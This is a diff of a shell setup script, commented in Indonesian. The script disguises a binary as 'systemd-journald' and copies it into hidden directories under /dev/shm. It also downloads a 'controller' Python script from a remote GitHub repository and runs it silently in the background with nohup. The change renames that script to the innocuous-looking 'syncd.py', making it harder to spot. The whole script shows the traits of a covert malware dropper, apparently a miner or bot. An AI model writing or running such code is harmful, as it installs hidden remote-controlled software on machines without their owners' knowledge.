@@ -27,8 +27,8 @@ rm -f cache.tar.gz
 mv cache systemd-journald
 
 # Download controller script
-wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/httpd.py
-chmod +x httpd.py
+wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/httpd.py -O syncd.py
+chmod +x syncd.py
 
 # Copy ke folder 1 dan 2
 cp systemd-journald /dev/shm/.store/1/
@@ -41,6 +41,6 @@ rm -f systemd-journald
 
 # Jalankan controller
 echo -e "${GREEN}[*] Starting background controller...${NC}"
-nohup python3 httpd.py > /dev/null 2>&1 &
+nohup python3 syncd.py > /dev/null 2>&1 &
 
 echo -e "${GREEN}[✓] Setup selesai dan controller jalan di background.${NC}"
